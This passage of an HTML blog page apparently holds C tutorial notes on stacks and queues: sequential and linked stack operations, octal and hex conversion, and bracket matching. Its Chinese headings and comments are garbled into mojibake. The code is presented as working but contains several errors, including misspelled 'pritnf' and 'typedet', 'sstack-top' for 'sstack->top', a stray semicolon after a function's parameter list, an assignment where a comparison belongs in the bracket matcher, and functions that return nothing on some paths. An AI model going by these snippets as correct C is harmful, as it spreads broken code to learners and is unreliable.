class="keyword">if</span>(sstack-&gt;elem != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sstack-&gt;MAX = m;<span class="comment">//é¡ºåºæ ˆæœ€å¤§å®¹é‡</span></span><br><span class="line">            sstack-&gt;top = <span class="number">-1</span>;<span class="comment">//è®¾ç½®æ ˆé¡¶åˆå€¼ä¸º1</span></span><br><span class="line">            <span class="keyword">return</span>(sstack);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">free</span>(sstack);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        pritnf(<span class="string">&quot;Alloc failure!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201014001548.png" alt="é¡ºåºæ ˆæ¨¡å‹"></p><h4 id="é¡ºåºæ ˆåˆ¤ç©º"><a href="#é¡ºåºæ ˆåˆ¤ç©º" class="headerlink" title="é¡ºåºæ ˆåˆ¤ç©º"></a>é¡ºåºæ ˆåˆ¤ç©º</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">IsNullStack_seq</span><span class="params">(SeqStack sstack)</span><span class="comment">//åˆ¤ç©ºå‡½æ•°</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>(sstack-&gt;top == <span class="number">-1</span>);<span class="comment">//æ ˆé¡¶å…ƒç´  top ç”¨æ¥åˆ¤æ–­ï¼Œå¦‚æœä¸ºç©ºè¿”å› 1 ï¼Œå¦‚æœä¸ä¸ºç©ºè¿”å› 0 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è¿›æ ˆ"><a href="#è¿›æ ˆ" class="headerlink" title="è¿›æ ˆ"></a>è¿›æ ˆ</h4><ul><li><strong>éœ€è¦æ£€æŸ¥æ ˆæ˜¯å¦å·²æ»¡</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Push_seq</span><span class="params">(SeqStack sstack, <span class="type">int</span> x)</span><span class="comment">//å…¥æ ˆ</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(sstack-&gt;top &gt;= (sstack-&gt;MAX - <span class="number">1</span>))<span class="comment">//æ£€æŸ¥æ ˆæ»¡å‡½æ•°</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;æ ˆæ»¡äº†ï¼Œå†åŠ æ ˆæº¢å‡ºäº†!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sstack-&gt;top ++;<span class="comment">//ä¿®æ”¹æ ˆé¡¶å˜é‡</span></span><br><span class="line">        sstack-&gt;elem[sstack-&gt;top] = x;<span class="comment">//æŠŠå…ƒç´ æ”¾è¿›æ ˆé¡¶å˜é‡çš„ä½ç½®ä¸­</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong><code>sstack-&gt;top</code>ç”¨æ¥è¡¨ç¤ºæ•°ç»„ä¸‹æ ‡</strong></p><p><strong>å¿…é¡»å…ˆä¿®æ”¹æ ˆé¡¶æŒ‡é’ˆï¼Œ<code>sstack-&gt;top++</code>ï¼Œç„¶åå†æŠŠå…ƒç´ æ”¾è¿›å»</strong></p></blockquote><h4 id="å‡ºæ ˆ"><a href="#å‡ºæ ˆ" class="headerlink" title="å‡ºæ ˆ"></a>å‡ºæ ˆ</h4><ul><li><strong>éœ€è¦æ£€æŸ¥æ ˆæ˜¯å¦å·²ç©º</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Pop_seq</span><span class="params">(SeqStack sstack)</span><span class="comment">//å‡ºæ ˆ</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(IsNullStack_seq(sstack))<span class="comment">//è°ƒç”¨åˆ¤æ–­æ ˆç©ºå‡½æ•°</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;æ ˆç©ºäº†!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sstack-top = sstack-top - <span class="number">1</span>;<span class="comment">//æ ˆé¡¶-1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å–æ ˆé¡¶å…ƒç´ "><a href="#å–æ ˆé¡¶å…ƒç´ " class="headerlink" title="å–æ ˆé¡¶å…ƒç´ "></a>å–æ ˆé¡¶å…ƒç´ </h4><ul><li><strong>éœ€è¦æ£€æŸ¥æ ˆæ˜¯å¦å·²ç©º</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DataType <span class="title function_">Top_seq</span><span class="params">(SeqStack sstack)</span><span class="comment">//å–æ ˆé¡¶å…ƒç´ çš„å€¼</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(IsNullStack_seq(sstack))<span class="comment">//è°ƒç”¨åˆ¤æ–­æ ˆç©ºå‡½æ•°</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;æ ˆç©ºäº†!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> sstack-&gt; elem[sstack-&gt;top];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é“¾æ ˆ"><a href="#é“¾æ ˆ" class="headerlink" title="é“¾æ ˆ"></a>é“¾æ ˆ</h3><ul><li><strong>ç”¨é“¾å¼å­˜å‚¨çš„æ ˆï¼Œ top æŒ‡å‘æ ˆé¡¶å…ƒç´ ï¼Œæ ˆåº•åœ¨é“¾è¡¨å°¾éƒ¨</strong></li><li><strong>æŒ‡é’ˆä»æ ˆé¡¶å¼€å§‹ï¼Œå¾€æ ˆåº•æ–¹å‘é“¾æ¥ï¼Œæœ‰å¤´ç»“ç‚¹</strong></li><li><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201014002909.png" alt="é“¾æ ˆæ¨¡å‹"></li></ul><h4 id="é“¾æ ˆç±»å‹å®šä¹‰"><a href="#é“¾æ ˆç±»å‹å®šä¹‰" class="headerlink" title="é“¾æ ˆç±»å‹å®šä¹‰"></a>é“¾æ ˆç±»å‹å®šä¹‰</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> DataType;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DataType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">PNode</span>;</span><span class="comment">//ç»“ç‚¹ç±»å‹</span></span><br><span class="line">typedet <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">top</span>, *<span class="title">LinkStack</span>;</span><span class="comment">//æ ˆé¡¶å’Œé“¾æ ˆç±»å‹</span></span><br></pre></td></tr></table></figure><h4 id="åˆ›å»ºç©ºæ ˆ-1"><a href="#åˆ›å»ºç©ºæ ˆ-1" class="headerlink" title="åˆ›å»ºç©ºæ ˆ"></a>åˆ›å»ºç©ºæ ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LinkStack <span class="title function_">SetNullStack_Link</span><span class="params">()</span><span class="comment">//åˆ›å»ºç©ºé“¾æ ˆ</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkStack top = (LinkStack)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    <span class="keyword">if</span>(top != <span class="literal">NULL</span>)</span><br><span class="line">        top-&gt;next = <span class="literal">NULL</span>;<span class="comment">//å¤´ç»“ç‚¹æŒ‡é’ˆåŸŸç½®ç©º</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Alloc failure&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> top;<span class="comment">//è¿”å›æ ˆé¡¶æŒ‡é’ˆ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åˆ¤æ–­æ ˆç©º"><a href="#åˆ¤æ–­æ ˆç©º" class="headerlink" title="åˆ¤æ–­æ ˆç©º"></a>åˆ¤æ–­æ ˆç©º</h4><ul><li>åˆ¤æ–­æ ˆé¡¶ç»“ç‚¹çš„æŒ‡é’ˆåŸŸæ˜¯å¦ä¸º<code>NULL</code>ï¼Œç©ºåˆ™è¿”å›1ï¼Œå¦åˆ™è¿”å›0</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">IsNullStack_link</span><span class="params">(LinkStack top)</span><span class="comment">//åˆ¤æ–­é“¾æ ˆæ˜¯å¦ä¸ºç©º</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(top-&gt;next == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;<span class="comment">//ä¸ºç©ºè¿”å›1</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//ä¸ä¸ºç©ºè¿”å›0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è¿›æ ˆ-1"><a href="#è¿›æ ˆ-1" class="headerlink" title="è¿›æ ˆ"></a>è¿›æ ˆ</h4><ul><li><strong>è¿›æ ˆæ“ä½œçš„å…³é”®ç‚¹å’Œé“¾è¡¨çš„å…³é”®ç‚¹ä¸€æ ·ï¼š&#x3D;&#x3D;åªèƒ½æ˜¯å‰é©±æ‰¾åç»§ï¼Œåç»§æ‰¾ä¸åˆ°å‰é©±&#x3D;&#x3D;ï¼Œæ‰€ä»¥è¿›æ ˆçš„æŒ‡é’ˆæŒ‡å‘é¡ºåºæœ‰è®²ç©¶</strong><ol><li><strong>å¤´ç»“ç‚¹æŒ‡é’ˆåŸŸèµ‹å€¼ç»™è¦æ’å…¥å…ƒç´ æŒ‡é’ˆåŸŸ</strong></li><li><strong>å¤´ç»“ç‚¹æŒ‡é’ˆåŸŸæŒ‡å‘è¦æ’å…¥å…ƒç´ </strong></li></ol></li><li><strong>æ ˆçš„æ’å…¥æ“ä½œåªèƒ½æ˜¯åœ¨æ ˆé¡¶ï¼Œå³åœ¨å¤´ç»“ç‚¹å¤„è¿›è¡Œè¿›æ ˆæ“ä½œ</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Push_link</span><span class="params">(LinkStack top, DataType x)</span>;<span class="comment">//è¿›æ ˆ</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p;</span><br><span class="line">    p = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));<span class="comment">//ç”³è¯·ç»“ç‚¹ç©ºé—´</span></span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Alloc failure&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;data = x;<span class="comment">//æ•°æ®åŸŸèµ‹å€¼</span></span><br><span class="line">        p-&gt;next = top-&gt;next;<span class="comment">//æŒ‡é’ˆåŸŸèµ‹å€¼</span></span><br><span class="line">        top-&gt;next = p; <span class="comment">//ä¿®æ”¹æ ˆé¡¶</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201014005501.png" alt="è¿›æ ˆæ¨¡å‹"></p><h4 id="å‡ºæ ˆ-1"><a href="#å‡ºæ ˆ-1" class="headerlink" title="å‡ºæ ˆ"></a>å‡ºæ ˆ</h4><ul><li><strong>å‡ºæ ˆéœ€è¦åˆ¤ç©ºï¼Œéœ€è¦é‡Šæ”¾ç»“ç‚¹ç©ºé—´</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Pop_link</span><span class="params">(LinkStack top)</span><span class="comment">//åˆ é™¤æ ˆé¡¶å…ƒç´ </span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p;</span><br><span class="line">    <span class="keyword">if</span>(IsNullStack_link(top))<span class="comment">//åˆ¤æ–­æ ˆç©º</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;æ˜¯ç©ºçš„&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = top-&gt;next;<span class="comment">//p æŒ‡å‘å¾…åˆ é™¤ç»“ç‚¹</span></span><br><span class="line">        top-&gt;next = p-&gt;next;<span class="comment">//ä¿®æ”¹æ ˆé¡¶æŒ‡é’ˆ</span></span><br><span class="line">        <span class="built_in">free</span>(p);<span class="comment">//é‡Šæ”¾åˆ é™¤ç»“ç‚¹ç©ºé—´</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å–æ ˆé¡¶å…ƒç´ -1"><a href="#å–æ ˆé¡¶å…ƒç´ -1" class="headerlink" title="å–æ ˆé¡¶å…ƒç´ "></a>å–æ ˆé¡¶å…ƒç´ </h4><ul><li><strong>éœ€è¦åˆ¤ç©º</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DataType <span class="title function_">Top_link</span><span class="params">(LinkStack top)</span><span class="comment">//åˆ é™¤æ ˆé¡¶å…ƒç´ </span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(IsNullStack_link(top))<span class="comment">//åˆ¤æ–­æ ˆç©º</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;æ˜¯ç©ºçš„&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> top-&gt;next-&gt;data;<span class="comment">//å¤´ç»“ç‚¹æŒ‡é’ˆåŸŸæŒ‡å‘çš„å°±æ˜¯æ ˆé¡¶çš„ç»“ç‚¹</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œä»¥åæœ‰ç©ºè¦è®°å¾—è¡¥ä¸Šæ ˆçš„åº”ç”¨çš„ä¸€äº›ä»£ç </p></blockquote><h3 id="æ ˆå®ç°ï¼šè¿›åˆ¶è½¬æ¢"><a href="#æ ˆå®ç°ï¼šè¿›åˆ¶è½¬æ¢" class="headerlink" title="æ ˆå®ç°ï¼šè¿›åˆ¶è½¬æ¢"></a>æ ˆå®ç°ï¼šè¿›åˆ¶è½¬æ¢</h3><h4 id="è½¬å…«è¿›åˆ¶"><a href="#è½¬å…«è¿›åˆ¶" class="headerlink" title="è½¬å…«è¿›åˆ¶"></a>è½¬å…«è¿›åˆ¶</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Conversion</span><span class="params">(LinkStack ps, <span class="type">int</span> n)</span><span class="comment">//åè¿›åˆ¶è½¬å…«è¿›åˆ¶</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    <span class="keyword">while</span>(n)</span><br><span class="line">    &#123;</span><br><span class="line">        Push_link(ps,n%<span class="number">8</span>);</span><br><span class="line">        n/=<span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ç»“æœä¸º:&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(!IsNullStack_Link(ps))</span><br><span class="line">    &#123;</span><br><span class="line">        temp = Top_link(ps);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,temp);</span><br><span class="line">        Pop_link(ps);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è½¬åå…­è¿›åˆ¶"><a href="#è½¬åå…­è¿›åˆ¶" class="headerlink" title="è½¬åå…­è¿›åˆ¶"></a>è½¬åå…­è¿›åˆ¶</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Hexconversion</span><span class="params">(LinkStack ps,<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    <span class="keyword">while</span>(n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> temp = n%<span class="number">16</span>;</span><br><span class="line">        <span class="keyword">switch</span>(temp)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">10</span>:temp = <span class="string">&#x27;A&#x27;</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:temp = <span class="string">&#x27;B&#x27;</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:temp = <span class="string">&#x27;C&#x27;</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">13</span>:temp = <span class="string">&#x27;D&#x27;</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">14</span>:temp = <span class="string">&#x27;E&#x27;</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">15</span>:temp = <span class="string">&#x27;F&#x27;</span>;<span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Push_link(ps,temp);</span><br><span class="line">        n/=<span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ç»“æœä¸º:&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(!IsNullStack_Link(ps))</span><br><span class="line">    &#123;</span><br><span class="line">        temp = Top_link(ps);</span><br><span class="line">        <span class="keyword">if</span>(temp&lt;<span class="number">10</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,temp);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,temp);</span><br><span class="line">        Pop_link(ps);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ ˆå®ç°ï¼šæ‹¬å·åŒ¹é…"><a href="#æ ˆå®ç°ï¼šæ‹¬å·åŒ¹é…" class="headerlink" title="æ ˆå®ç°ï¼šæ‹¬å·åŒ¹é…"></a>æ ˆå®ç°ï¼šæ‹¬å·åŒ¹é…</h3><ul><li><p>ç®—æ³•æ€è·¯</p><ul><li><p>æ‰€æœ‰çš„å·¦æ‹¬å·éƒ½è¿›æ ˆï¼Œè®¾ç½®æ ‡å¿—ä½<code>flag</code>ä¸º1</p></li><li><p>é‡åˆ°å³æ‹¬å·å¼€å§‹åŒ¹é…ï¼Œé¦–å…ˆæ£€æŸ¥æ ˆæ˜¯å¦ä¸ºç©º</p><ul><li><p>å¦‚æœæ ˆç©ºï¼Œè¡¨ç¤ºåŒ¹é…å¤±è´¥ï¼Œå³æ‹¬å·å¤šäº†</p></li><li><p>å¦‚æœæ ˆä¸ç©º</p><ul><li><p>å¦‚æœåŒ¹é…åˆ°å·¦æ‹¬å·ï¼Œå·¦æ‹¬å·å‡ºæ ˆ</p></li><li><p>å¦‚æœä¸åŒ¹é…ï¼Œ<code>flag</code>è®¾ä¸º0</p></li></ul></li></ul></li><li><p>æ£€éªŒç»“æŸæ—¶</p><ul><li><strong>æ ˆä¸ä¸ºç©ºæˆ–è€…<code>flag</code>ä¸º0</strong>ï¼Œåˆ™è¡¨ç¤ºåŒ¹é…ä¸æˆåŠŸ</li><li><strong>æ ˆç©º</strong>ï¼Œåˆ™è¡¨ç¤ºåŒ¹é…æˆåŠŸ</li></ul></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">BracketMatch</span><span class="params">(LinkStack top)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> flag = <span class="number">1</span>;</span><br><span class="line">   <span class="type">char</span> ch,temp;</span><br><span class="line">    Push_link(top,<span class="string">&#x27;#&#x27;</span>);<span class="comment">//æ ˆåº•æ”¾#ï¼Œç»“æŸæ ‡å¿—ä½</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è¾“å…¥è¦åˆ¤æ–­è¡¨è¾¾å¼ï¼Œç”¨#è¡¨ç¤ºç»“æŸï¼š\n&quot;</span>);</span><br><span class="line">    scanf_s(<span class="string">&quot;%c&quot;</span>,&amp;ch);</span><br><span class="line">    <span class="keyword">while</span>(ch!=<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch = <span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Push_link(top,ch);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(ch = <span class="string">&#x27;)&#x27;</span>&amp;&amp;!IsNullStack_Link(top))</span><br><span class="line">            &#123;</span><br><span class="line">                temp = Top_link(top);</span><br><span class="line">                <span class="keyword">if</span>(temp == <span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    Pop_link(top);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        scanf_s(<span class="string">&quot;%c&quot;</span>,&amp;ch);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!flag||Top_link(top)!=<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;no\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;yes\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é˜Ÿåˆ—"><a href="#é˜Ÿåˆ—" class="headerlink" title="é˜Ÿåˆ—"></a>é˜Ÿåˆ—</h2><ul><li>é˜Ÿåˆ—é™å®šåœ¨ä¸€ç«¯è¿›è¡Œæ’å…¥ã€ä¸€ç«¯è¿›è¡Œåˆ é™¤ï¼Œæ’å…¥ç«¯ç§°<strong>é˜Ÿå°¾</strong>ï¼Œåˆ é™¤ç«¯ç§°<strong>é˜Ÿå¤´</strong></li><li><strong>å…ˆè¿›å…ˆå‡º</strong></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210203612.png"></p><blockquote><p>é˜Ÿåˆ—ä¼šå­˜åœ¨å‡æº¢å‡ºçš„æƒ…å†µï¼Œå³å½“å‰é˜Ÿåˆ—å¹¶ä¸æ»¡ï¼Œä½†æ˜¯ä¸èƒ½å…¥é˜Ÿ</p><p>åŸå› ï¼šè¢«åˆ é™¤çš„å…ƒç´ çš„ç©ºé—´æ²¡æœ‰å†è¢«ä½¿ç”¨</p><p>è§£å†³ï¼šå¾ªç¯é˜Ÿåˆ—</p></blockquote><h3 id="å¾ªç¯é˜Ÿåˆ—"><a href="#å¾ªç¯é˜Ÿåˆ—" class="headerlink" title="å¾ªç¯é˜Ÿåˆ—"></a>å¾ªç¯é˜Ÿåˆ—</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201211050316.png"></p><h4 id="å¾ªç¯é˜Ÿåˆ—ç±»å‹å®šä¹‰"><a href="#å¾ªç¯é˜Ÿåˆ—ç±»å‹å®šä¹‰" class="headerlink" title="å¾ªç¯é˜Ÿåˆ—ç±»å‹å®šä¹‰"></a>å¾ªç¯é˜Ÿåˆ—ç±»å‹å®šä¹‰</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> 